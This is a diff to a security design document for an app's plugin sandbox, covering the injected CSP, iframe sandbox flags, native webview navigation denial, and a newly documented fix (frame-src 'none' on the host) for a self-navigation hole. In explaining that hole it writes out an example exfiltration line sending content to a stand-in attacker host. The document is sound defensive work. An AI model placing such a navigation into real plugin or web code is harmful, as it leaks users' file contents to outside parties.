@@ -53,7 +53,7 @@ Plugin HTML never runs in the app's own context. The client renders it in a sand
 | Web, Electron | `<iframe sandbox="allow-scripts" srcDoc=...>` — opaque origin           |
 | iOS, Android  | `react-native-webview`, navigation denied for anything but the document |
 
-Both get the same injected CSP: `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'; base-uri 'none'; frame-src 'none'; object-src 'none'`. A plugin cannot fetch, cannot navigate, cannot read cookies, and cannot reach the daemon except through the bridge below.
+Both get the same injected CSP: `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'; base-uri 'none'; frame-src 'none'; object-src 'none'`. A plugin cannot fetch, cannot read cookies, and cannot reach the daemon except through the bridge below.
 
 `form-action` and `base-uri` are listed explicitly because neither falls back to `default-src`. Without them a form POST is an open exfiltration path on native, where there is no iframe `sandbox` attribute to fall back on.
 
@@ -62,6 +62,16 @@ The CSP is injected by wrapping the plugin's HTML in our own document shell, nev
 On native, `originWhitelist` is `["*"]`. That looks backwards and isn't: react-native-webview consults the whitelist _before_ the navigation callback and hands non-matching URLs to `Linking.openURL`, which opens them in the user's real browser. Widening the whitelist is what routes every navigation through our own deny-by-default check.
 
 Deliberately absent from the iframe sandbox: `allow-same-origin` (would give the plugin an origin and therefore storage and same-origin reach), `allow-popups`, `allow-top-navigation`, `allow-forms`, `allow-modals`.
+
+### The host document carries a policy too
+
+The guest CSP cannot stop the plugin navigating _itself_. `navigate-to` was dropped from the spec, and `default-src` does not cover a document's own navigation — so `location.href = "https://evil.tld/?d=" + content` leaves from inside the frame with the policy intact.
+
+What stops it is `frame-src 'none'` on the **host** document, because a child frame's navigation is checked against the parent's policy, not its own. `about:srcdoc` is exempt, so the plugin still renders. It is set in both places the app HTML is served: `packages/server/src/server/web-ui.ts` (header) and `packages/app/public/index.html` (meta, which is what Electron's `paseo://` handler and the Expo dev server deliver). `setupSubframeNavigationPrevention()` in the desktop window manager is a second line of defence on `will-frame-navigate`.
+
+A blocked navigation does not leave the plugin running: Chromium replaces the frame with an empty document. The plugin stops working and later host `postMessage`s go nowhere. That is the intended failure — fail closed, not fail quiet.
+
+Electron's in-app browser `<webview>` is unaffected; it is not a frame navigation and never reaches either gate.
 
 ## The host bridge
 
@@ -113,7 +123,9 @@ A plugin whose `paseoVersion` does not match, whose manifest stopped parsing, or
 
 Installing a plugin means trusting whoever published it with what the bridge exposes: the content of files you preview with it, and the ability to ask the app to open a path inside the workspace.
 
-Three mechanisms keep that content on the machine, and all three have to hold: the CSP denies every outbound request, the iframe has no `allow-forms`/`allow-popups`/`allow-top-navigation` on web, and navigation is denied on native. Two of them were broken at once during review — a regex-placed CSP and an `originWhitelist` that bypassed our own navigation check — so treat any change to the sandbox as security-relevant and test the denial, not just the happy path.
+Four mechanisms keep that content on the machine, and all four have to hold: the guest CSP denies every outbound request, `frame-src 'none'` on the host document denies the frame navigating itself, the iframe has no `allow-forms`/`allow-popups`/`allow-top-navigation` on web, and navigation is denied on native.
+
+Three of the four were found broken during review, in two rounds — a regex-placed CSP, an `originWhitelist` that bypassed our own navigation check, and the self-navigation hole that survived the first round of fixes. All three passed typecheck, lint, and the test suite. Treat any change to the sandbox as security-relevant, and prove the denial in a real browser rather than reasoning about the policy: `packages/app/src/plugins/sandbox-denial.browser.test.ts` reads the shipped CSP out of `public/index.html` and mounts a plugin that actually tries each escape.
 
 The daemon serves an entry only when its plugin is enabled and the entry is declared in the manifest's `contributes`, and it re-checks containment after resolving symlinks. A disabled plugin's code does not leave the daemon.
 
